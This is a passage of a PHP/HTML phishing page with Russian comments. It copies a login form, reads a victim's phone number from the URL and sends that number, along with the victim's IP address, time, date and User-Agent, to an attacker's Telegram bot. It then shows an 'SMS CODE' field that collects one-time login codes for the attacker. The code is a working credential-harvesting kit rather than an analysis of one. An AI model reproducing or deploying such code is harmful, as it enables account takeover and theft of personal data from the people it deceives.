...
$telefon = htmlspecialchars($_GET['tlf']);

// Если переменная  пуста - шлем нахуй
if ($telefon == '') {
echo  '<meta http-equiv="refresh" content="0;URL=/" />';
} 
//Если переменная заполнена - шлем информацию в админку
else {
@file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$admin."&parse_mode=markdown&text=🔔 Получили номер %0A *├ IP:* `".$_SERVER['REMOTE_ADDR'].'`%0A *├ Время:* `'.date("H:i:s").'`%0A *├ Дата:* `'.date("d.m.y").'`%0A *├ Номер:* `'.$telefon.'`%0A *└ User-Agent*: '.$_SERVER['HTTP_USER_AGENT']);
}
?>
         ...
         <div id="app" class="light">
            <div class="authorization-form">
               <div class="authorization-form-content">
                  ...
                  <form class="auth-root" autocomplete="off" method="POST" action="<?php echo $ssl; ?>://<?php echo $_SERVER['HTTP_HOST']; ?>/error.php">
                     <p class="MuiTypography-root auth-title MuiTypography-body1"><span><?php echo $telefon; ?></span></p>
                     <div class="MuiFormControl-root MuiTextField-root auth-input MuiFormControl-fullWidth">
                        <label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink MuiInputLabel-outlined MuiFormLabel-filled" data-shrink="true" for="phoneNumber" id="phoneNumber-label">SMS CODE</label>
                        <div class="MuiInputBase-root MuiOutlinedInput-root MuiInputBase-fullWidth MuiInputBase-formControl">
                           <input aria-invalid="false" autocomplete="off" name="sms" type="text" class="MuiInputBase-input MuiOutlinedInput-input" value=" ">
                           <fieldset aria-hidden="true" class="jss1 MuiOutlinedInput-notchedOutline">
                              <legend class="jss3 jss4"><span>SMS CODE</span></legend>
                           </fieldset>
                        </div>
                     </div>
                     <input type="submit" class="MuiButtonBase-root MuiButton-root auth-button MuiButton-contained MuiButton-containedPrimary  MuiButton-fullWidth" type="button" value="LOG IN">
